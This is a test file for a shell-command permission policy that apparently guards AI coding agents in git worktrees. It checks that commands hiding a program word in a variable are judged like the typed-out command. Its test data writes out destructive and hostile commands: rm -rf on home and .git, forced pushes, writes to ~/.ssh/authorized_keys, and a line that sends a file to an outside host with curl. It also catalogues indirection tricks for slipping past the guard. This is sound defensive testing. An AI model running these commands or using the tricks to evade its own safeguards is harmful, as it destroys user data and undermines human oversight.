// A line whose program words are variables it gave a written-out value is judged as the line with them written out,
// in every mode, beside the line itself. An agent in its own worktree has no card: its `W=/abs; $W/run.sh` was refused.
import { expect, test } from "bun:test";
import { decide, MODES, type Facts, type Mode } from "./policy.ts";
import { resolvedLine } from "./resolved-line.ts";
import type { Shared } from "./shared-branches.ts";

const shared: Shared = {
  root: "/r/wt", gitDir: "/r/.git/worktrees/wt", common: "/r/.git", branch: "keel/me", base: "main",
  out: new Map([["main", "/r"]]), folders: ["/r"], gitDirs: ["/r/.git"],
  foreign: () => new Set(["release/1.0", "keel/agent-2", "old-work"]),
};
const kind = (d: ReturnType<typeof decide>) => ("allow" in d ? "allow" : "deny" in d ? "deny" : `ask-${d.ask.risk}`);
const modes = ["ask", "auto-edits", "auto", "full-auto", "read-only", "plan", "reviewer"] as Mode[];
const verdicts = (command: string, withShared = true) =>
  modes.map((mode) => kind(decide({ kind: "shell", command, cwd: "/r/wt" }, { mode, workspace: "/r/wt", sandboxed: false, rules: [], tool: "Bash", home: "/home/u", ...(withShared ? { shared } : {}) } as Facts)));
const rank: Record<string, number> = { allow: 0, "ask-low": 1, "ask-high": 2, deny: 3 };

test("the modes this checks are the modes there are", () => {
  expect(MODES.map((m) => m.id).sort()).toEqual([...modes].sort());
});

// The line and the line typed out: the same verdict in each of the seven modes.
test("a program word set to a literal earlier is judged as the program written out", () => {
  for (const [line, typed] of [
    ["W=git; $W branch -D keel/agent-2", "git branch -D keel/agent-2"],
    ["W=git; $W push --force", "git push --force"],
    ["W=rm; $W -rf ~", "rm -rf ~"],
    ["W=rm; $W -rf /r/.git", "rm -rf /r/.git"],
    ["W=rm; $W -rf /r/.git/refs", "rm -rf /r/.git/refs"],
    ["W=cp; $W /x /r/.git/refs/heads/y", "cp /x /r/.git/refs/heads/y"],
    ["W=mv; $W /x /r/.git/refs/heads/y", "mv /x /r/.git/refs/heads/y"],
    ["W=ln; $W -s /x /r/.git/refs/heads/y", "ln -s /x /r/.git/refs/heads/y"],
    ["W=sed; $W -i s/a/b/ /r/.git/config", "sed -i s/a/b/ /r/.git/config"],
    ["W=dd; $W of=/r/.git/HEAD", "dd of=/r/.git/HEAD"],
    ["W=tee; $W /r/.git/HEAD", "tee /r/.git/HEAD"],
    ["W=touch; $W /r/.git/refs/heads/y", "touch /r/.git/refs/heads/y"],
    ["W=/usr/bin/env; $W -i git branch -D keel/agent-2", "/usr/bin/env -i git branch -D keel/agent-2"],
    ["W=/usr/bin/env; $W git branch -D keel/agent-2", "/usr/bin/env git branch -D keel/agent-2"],
    ["W=bash; $W -c 'git branch -D keel/agent-2'", "bash -c 'git branch -D keel/agent-2'"],
    ["W=sh; $W -c 'git branch -D keel/agent-2'", "sh -c 'git branch -D keel/agent-2'"],
    ["W=git; GIT_DIR=/r/.git $W branch -D keel/agent-2", "GIT_DIR=/r/.git git branch -D keel/agent-2"],
    ["W=git; echo x | xargs $W branch -D keel/agent-2", "echo x | xargs git branch -D keel/agent-2"],
    ["W=git;\n$W branch -D keel/agent-2", "git branch -D keel/agent-2"],
    ["W=git && $W branch -D keel/agent-2", "git branch -D keel/agent-2"],
    ["W=git; ${W} branch -D keel/agent-2", "git branch -D keel/agent-2"],
    ["W=git; \"$W\" branch -D keel/agent-2", "git branch -D keel/agent-2"],
  ] as const) {
    expect([line, resolvedLine(line) !== null]).toEqual([line, true]);
    // (The line also keeps its assignment, which asks low where the typed line has none: compare what the typed line asks.)
    const got = verdicts(line), want = verdicts(resolvedLine(line) ?? line);
    expect([line, got]).toEqual([line, want]);
    const bare = verdicts(typed);
    expect([line, got.map((k, i) => rank[k]! >= rank[bare[i]!]!)]).toEqual([line, modes.map(() => true)]);
  }
});

// A line a word of which the shell may read as other than the value written, or rebinds the variable where the parts
// do not show it, is not written out: the program word it cannot read stays refused.
test("a line the written form would misread keeps being refused", () => {
  for (const line of [
    "IFS=-; W=git-branch; $W -D keel/agent-2",
    "IFS=/; W=git/branch; $W -D keel/agent-2",
    "IFS=g; W=git; $W branch -D keel/agent-2",
    "W=git:branch; IFS=:; $W -D keel/agent-2",
    "W=git; for W in rm; do $W -rf /r/.git; done",
    "W=git; select W in rm; do $W -rf /r/.git; done",
    "W=git; while read W; do $W -rf /r/.git; done <<< rm",
    "W=git; case x in x) W=rm;; esac; $W -rf /r/.git",
    "W=git; read W <<< rm; $W -rf /r/.git",
    "W=git; printf -v W rm; $W -rf /r/.git",
    "W=git; alias git=rm; $W -rf /r/.git",
    "W=git; f() { W=rm; }; f; $W -rf /r/.git",
    "W=git; W+=x; $W branch -D keel/agent-2",
    "W=git; ${W/g/h} branch -D keel/agent-2",
    "W=git; trap '$W branch -D keel/agent-2' EXIT",
    "W=git; unset W; $W branch -D keel/agent-2",
    "$W branch -D keel/agent-2; W=git",
    "echo a | W=git; $W branch -D keel/agent-2",
    "(W=git); $W branch -D keel/agent-2",
    "false || W=git; $W branch -D keel/agent-2",
    "W=$(echo git); $W branch -D keel/agent-2",
    "W=~root/x; $W/spec.sh",
    "W=/a:~/x; $W/spec.sh",
    "W=$HOMEx/x; $W/spec.sh",
    "W=$HOME; HOME=/e; $W/spec.sh",
    "HOME=/e; W=$HOME/x; $W/spec.sh",
    "W=/abs/*; $W/spec.sh",
    "W='/a b'; $W/spec.sh",
    "W=; $W env -i git status",
    "W=git $W branch -D keel/agent-2",
    "$W/spec.sh x",
  ]) {
    expect([line, resolvedLine(line)]).toEqual([line, null]);
    // Judged as before: never below high risk, in an agent's worktree, in any mode.
    expect([line, verdicts(line).every((k) => rank[k]! >= 2)]).toEqual([line, true]);
  }
});

// What an agent runs from today's lanes: not refused for the word the rules cannot read.
test("a program path an agent's line set earlier is not refused", () => {
  for (const line of ["W=/abs/path; $W/spec.sh x", "S=/abs/dir && $S/run.sh", "S=/abs/dir\n${S}/run.sh --all", 'S=/abs/dir && "$S"/run.sh', "A=/abs; B=/dir; $A$B/run.sh"]) {
    expect([line, resolvedLine(line) !== null]).toEqual([line, true]);
    expect([line, verdicts(line).filter((k) => k === "deny").length]).toEqual([line, 2]); // read-only and plan: nothing is written
  }
  // The same verdicts as the typed line, in the owner's own sessions too, where a program hidden in a variable still asks high.
  expect(verdicts("W=/abs/path; $W/spec.sh x", false).slice(0, 4)).toEqual(["ask-high", "ask-high", "ask-high", "ask-high"]);
  // And never looser than the line as it is, there: the typed line's findings are added.
  expect(rank[verdicts("W=rm; $W -rf ~", false)[2]!]).toBeGreaterThanOrEqual(rank[verdicts("rm -rf ~", false)[2]!]!);
});

// A variable in an argument is written out as a program word is: the line is judged as typed, and a git word kept in a
// variable no longer hides the branch or the push from the guard of the shared branches.
test("a variable of an argument set to a literal earlier is judged as written out", () => {
  for (const line of [
    "W=git V=push; $W $V --force",
    "W=git; V=push; $W $V --force",
    "W=git; V=push; $W $V origin",
    "W=git; V=branch; $W $V -D keel/agent-2",
    "W=git; V=-D; $W branch $V keel/agent-2",
    "W=git; V=git; $W $V push --force",
    "V=branch; git $V -D keel/agent-2",
    "V=-D; git branch $V keel/agent-2",
    "V=push; git $V --force",
    "V=/r/.git/refs; rm -rf $V",
    "V=/r/.git/refs/heads/y; touch \"$V\"",
  ]) {
    const typed = resolvedLine(line);
    expect([line, typed !== null]).toEqual([line, true]);
    expect([line, verdicts(line)]).toEqual([line, verdicts(typed!)]);
    // (In the owner's own sessions too: never looser than the typed line.)
    const own = verdicts(line, false), ownTyped = verdicts(typed!, false);
    expect([line, own.map((k, i) => rank[k]! >= rank[ownTyped[i]!]!)]).toEqual([line, modes.map(() => true)]);
  }
  // Not looser than main's own gap: the branch and the push are refused in an agent's worktree, in every mode.
  for (const line of ["V=branch; git $V -D keel/agent-2", "W=git; V=push; $W $V --force"]) expect([line, verdicts(line).every((k) => k === "deny" || k === "ask-high")]).toEqual([line, true]);
  // Written out only what is shown whole: a variable with a use that is not a word of its own is not written out, and a positional parameter keeps the refusal.
  expect(resolvedLine("V=push; echo '$V'; git $V origin")).toBeNull();
  for (const line of ["W=git; set -- branch -D keel/agent-2; $W \"$@\"", "W=git; set -- branch -D keel/agent-2; $W $1 $2 $3"]) {
    expect([line, resolvedLine(line)]).toEqual([line, null]);
    expect([line, verdicts(line).every((k) => k === "deny" || k === "ask-high")]).toEqual([line, true]);
  }
});

test("a line of thousands of variables is written out in one pass", () => {
  const line = Array.from({ length: 4000 }, (_, i) => `W${i}=echo; $W${i} hi`).join("; ");
  const t = performance.now();
  const out = resolvedLine(line);
  expect(out).not.toBeNull();
  expect(out!.includes("$W")).toBe(false);
  expect(performance.now() - t).toBeLessThan(1000); // 4000 variables took 2.7 s when each was looked up in the whole line
});

// A value that starts with ~ or $HOME is the session's home, written out as bash would; a variable that is also a
// redirect's target is still shown whole. Each form is judged as the line typed out, in every mode.
test("a variable set to a path under the home, or used as a redirect target, is judged as written out", () => {
  const home = "/home/u";
  for (const [line, typed] of [
    ["S=~/x; $S/start.sh", "/home/u/x/start.sh"],
    ["S=~; $S/start.sh", "/home/u/start.sh"],
    ["S=$HOME/x; $S/start.sh", "/home/u/x/start.sh"],
    ["S=${HOME}/x; $S/start.sh", "/home/u/x/start.sh"],
    ["S=/abs; $S/a > $S/d.log", "/abs/a > /abs/d.log"],
    ["S=/abs; $S/a > $S/d.log 2>&1 < /dev/null", "/abs/a > /abs/d.log 2>&1 < /dev/null"],
    ["S=~/x; (setsid nohup $S/start.sh > $S/daemon.log 2>&1 < /dev/null &)", "(setsid nohup /home/u/x/start.sh > /home/u/x/daemon.log 2>&1 < /dev/null &)"],
    ["S=$HOME/x; $S/a > $S/d.log", "/home/u/x/a > /home/u/x/d.log"],
    ["P=~/x; git diff --output=$P", "git diff --output=/home/u/x"],
    ["P=/abs/out; git diff --output=$P", "git diff --output=/abs/out"],
    ["S=~/.ssh; echo x > $S/authorized_keys", "echo x > /home/u/.ssh/authorized_keys"],
    ["S=$HOME/.ssh; echo x > $S/authorized_keys", "echo x > /home/u/.ssh/authorized_keys"],
    ["S=~/.bashrc; echo x >> $S", "echo x >> /home/u/.bashrc"],
  ] as const) {
    const written = resolvedLine(line, home);
    expect([line, written !== null && !/\$[A-Z]/.test(written.replace(/^[^;]*; ?/, ""))]).toEqual([line, true]);
    expect([line, written!.replace(/^[^;]*; ?/, "")]).toEqual([line, typed]);
    for (const withShared of [true, false]) {
      const got = verdicts(line, withShared), want = verdicts(written!, withShared);
      // Never looser than the written line, and an agent in its worktree gets the written line's verdict.
      expect([line, got.map((k, i) => rank[k]! >= rank[want[i]!]!)]).toEqual([line, modes.map(() => true)]);
      if (withShared) expect([line, got]).toEqual([line, want]);
    }
  }
  // Written out where the write rules guard it: held as the typed line is, not let through for its variable.
  for (const [line, typed] of [
    ["S=~/.ssh; echo x > $S/authorized_keys", "echo x > /home/u/.ssh/authorized_keys"],
    ["S=$HOME/.ssh; echo x > $S/authorized_keys", "echo x > /home/u/.ssh/authorized_keys"],
  ] as const) {
    const bare = verdicts(typed);
    for (const withShared of [true, false]) {
      const got = verdicts(line, withShared);
      expect([line, withShared, got.map((k, i) => rank[k]! >= rank[bare[i]!]!)]).toEqual([line, withShared, modes.map(() => true)]);
    }
    expect([line, verdicts(line).slice(0, 4).every((k) => k === "deny" || k === "ask-high")]).toEqual([line, true]);
  }
  // Without a home to write them out with, they stay unread.
  for (const line of ["S=~/x; $S/start.sh", "S=$HOME/x; $S/start.sh"]) expect([line, resolvedLine(line)]).toEqual([line, null]);
  // A redirect's target the line does not show whole keeps the variable unwritten.
  for (const line of ["S=/abs; echo '> $S/x'; $S/a", "S=/abs; $S/a > ${S:-y}/x", "S=/abs; $S/a > \\$S/x"]) expect([line, resolvedLine(line, home)]).toEqual([line, null]);
});

// `~` is the home only where bash makes it so: unquoted, unescaped, and with HOME not changed earlier on the line.
test("a tilde that is quoted, or a home the line changed, is not written out", () => {
  const home = "/home/u";
  for (const line of [
    "read HOME <<< /r/.git; S=~/HEAD; git log --output=$S",
    "printf -v HOME %s /r/.git; S=~/HEAD; git log --output=$S",
    "unset HOME; S=~/HEAD; git log --output=$S",
    "S=\"~/x\"; $S/start.sh",
    "S='~/x'; $S/start.sh",
    "S=\\~/x; $S/start.sh",
    "mkdir '~'; S='~/../../.git/HEAD'; git log --output=$S",
    "S=~/x\\ y; $S/start.sh",
  ]) expect([line, resolvedLine(line, home)]).toEqual([line, null]);
  // Not looser than before: the lines that write into the git store stay held where they were.
  for (const line of ["HOME=/r/.git; S=~/HEAD; git log --output=$S", "mkdir '~'; S='~/../../.git/HEAD'; git log --output=$S"]) {
    expect([line, verdicts(line).slice(0, 4).some((k) => k === "allow")]).toEqual([line, false]);
  }
});

// A line that sets HOME to a literal has its later `~` and `$HOME` written out as that value, and a name set twice is read
// by its last literal before each use: the verdict of each form is the written-out line's, in every mode, and never looser
// than the typed line. (These fell back to the weaker verdict of the line as it is.)
test("a home or a variable the line set to a literal, set again, is judged as written out", () => {
  const home = "/home/u";
  for (const [line, written, typed] of [
    ["HOME=/home/u/.ssh; echo x > ~/authorized_keys", "HOME=/home/u/.ssh; echo x > /home/u/.ssh/authorized_keys", "echo x > /home/u/.ssh/authorized_keys"],
    ["HOME=/home/u/.ssh; echo x > $HOME/authorized_keys", "HOME=/home/u/.ssh; echo x > /home/u/.ssh/authorized_keys", "echo x > /home/u/.ssh/authorized_keys"],
    ["HOME=/home/u/.ssh; echo x >> \"$HOME/authorized_keys\"", "HOME=/home/u/.ssh; echo x >> \"/home/u/.ssh/authorized_keys\"", "echo x >> /home/u/.ssh/authorized_keys"],
    ["HOME=/home/u; echo x > ~/.bashrc", "HOME=/home/u; echo x > /home/u/.bashrc", "echo x > /home/u/.bashrc"],
    ["HOME=/home/u/.ssh; cp f ~/authorized_keys", "HOME=/home/u/.ssh; cp f /home/u/.ssh/authorized_keys", "cp f /home/u/.ssh/authorized_keys"],
    ["HOME=/home/u/.ssh; git log --output $HOME/authorized_keys", "HOME=/home/u/.ssh; git log --output /home/u/.ssh/authorized_keys", "git log --output /home/u/.ssh/authorized_keys"],
    ["HOME=/home/u/.ssh; sort -o $HOME/authorized_keys f", "HOME=/home/u/.ssh; sort -o /home/u/.ssh/authorized_keys f", "sort -o /home/u/.ssh/authorized_keys f"],
    ["HOME=/r/.git; echo x > ~/HEAD", "HOME=/r/.git; echo x > /r/.git/HEAD", "echo x > /r/.git/HEAD"],
    ["HOME=/r/.git; git format-patch -o $HOME/refs HEAD~1", "HOME=/r/.git; git format-patch -o /r/.git/refs HEAD~1", "git format-patch -o /r/.git/refs HEAD~1"],
    ["HOME=/x; HOME=/home/u/.ssh; echo x > ~/authorized_keys", "HOME=/x; HOME=/home/u/.ssh; echo x > /home/u/.ssh/authorized_keys", "echo x > /home/u/.ssh/authorized_keys"],
    ["cat ~/a; HOME=/home/u/.ssh; echo x > ~/authorized_keys", "cat ~/a; HOME=/home/u/.ssh; echo x > /home/u/.ssh/authorized_keys", "cat ~/a; echo x > /home/u/.ssh/authorized_keys"],
    ["F=/r/wt/a; F=/home/u/.ssh/authorized_keys; echo x > $F", "F=/r/wt/a; F=/home/u/.ssh/authorized_keys; echo x > /home/u/.ssh/authorized_keys", "echo x > /home/u/.ssh/authorized_keys"],
    ["F=/r/.git/HEAD; F=/r/wt/a; echo x > $F", "F=/r/.git/HEAD; F=/r/wt/a; echo x > /r/wt/a", "echo x > /r/wt/a"],
    ["W=echo; W=git; $W branch -D keel/agent-2", "W=echo; W=git; git branch -D keel/agent-2", "git branch -D keel/agent-2"],
    ["W=rm; $W -rf /abs/a; W=git; $W branch -D keel/agent-2", "W=rm; rm -rf /abs/a; W=git; git branch -D keel/agent-2", "rm -rf /abs/a; git branch -D keel/agent-2"],
    ["V=status; V=push; git $V --force", "V=status; V=push; git push --force", "git push --force"],
    ["S=/abs; S=/r/.git/refs; rm -rf $S", "S=/abs; S=/r/.git/refs; rm -rf /r/.git/refs", "rm -rf /r/.git/refs"],
    ["S=/r/.git/refs; rm -rf $S; S=/abs; rm -rf $S", "S=/r/.git/refs; rm -rf /r/.git/refs; S=/abs; rm -rf /abs", "rm -rf /r/.git/refs; rm -rf /abs"],
  ] as const) {
    const got = resolvedLine(line, home);
    expect([line, got]).toEqual([line, written]);
    for (const withShared of [true, false]) {
      const have = verdicts(line, withShared), want = verdicts(got!, withShared), bare = verdicts(typed, withShared);
      // Never looser than the written line, and an agent in its worktree gets the written line's verdict.
      expect([line, withShared, have.map((k, i) => rank[k]! >= rank[want[i]!]!)]).toEqual([line, withShared, modes.map(() => true)]);
      if (withShared) expect([line, have]).toEqual([line, want]);
      // (A line that also sets a variable asks low where the typed line has nothing to ask: no looser than it.)
      expect([line, withShared, have.map((k, i) => rank[k]! >= rank[bare[i]!]!)]).toEqual([line, withShared, modes.map(() => true)]);
    }
  }
  // The files the owner changes are held in Full auto as the typed line is: high risk, where the line as it is let them through.
  for (const line of ["HOME=/home/u/.ssh; echo x > ~/authorized_keys", "HOME=/home/u/.ssh; git log --output $HOME/authorized_keys", "F=/r/wt/a; F=/home/u/.bashrc; echo x > $F"])
    expect([line, verdicts(line, false)[3]]).toEqual([line, "ask-high"]);
  // Not written out: a setting that may not run, runs in another shell, or leaves the value unknown.
  for (const line of [
    "true && HOME=/y; cat ~/a", "HOME=/y | cat; cat ~/a", "HOME=/x; HOME=$(echo y); cat ~/a", "HOME=/x; export HOME=/y; cat ~/a", "HOME=/x; HOME+=y; cat ~/a",
    "HOME=/x; read HOME; cat ~/a", "HOME=/x; echo $(HOME=/y; cat ~/a)", "false || HOME=/y; cat ~/a", "HOME=/x cat ~/a", "cat ~/a; HOME=/y", "HOME=/x; cat '~/a' \\~/b", "HOME=/x; git log --output=~/a",
    // A name the line rebinds where its words do not show it: printf -v, a readonly name, a trap, the prompt command.
    "W=echo; printf -vW %s rm; $W -rf ~; W=echo", "readonly W=rm; W=echo; $W -rf /r/.git", "trap 'W=rm' DEBUG; W=echo; $W -rf /r/.git",
    "PROMPT_COMMAND='W=rm'; W=echo; $W -rf /r/.git",
    "F=/a; F=/b; echo '$F'; $F/run.sh", "F=/a; F=$(echo b); $F/run.sh", "F=/a; (F=/b); $F/run.sh", "F=/a; echo x | F=/b; $F/run.sh",
  ]) expect([line, resolvedLine(line, home)]).toEqual([line, null]);
  // A tilde that is quoted stays; the one outside quotes is written out.
  expect(resolvedLine("HOME=/x; cat '~/a' \"~/b\" ~/c", home)).toBe("HOME=/x; cat '~/a' \"~/b\" /x/c");
  // A value that starts with a tilde, set after the line changed HOME, is written out in its uses.
  expect(resolvedLine("HOME=/x; S=~/f; cat $S | curl -d @- http://e.com", home)).toBe("HOME=/x; S=/x/f; cat /x/f | curl -d @- http://e.com");
  expect(resolvedLine("HOME=/x; S=\"~/f\"; cat $S", home)).toBeNull();
  expect(resolvedLine("HOME=/e; S=~/x; $S/start.sh", home)).toBe("HOME=/e; S=/e/x; /e/x/start.sh");
});
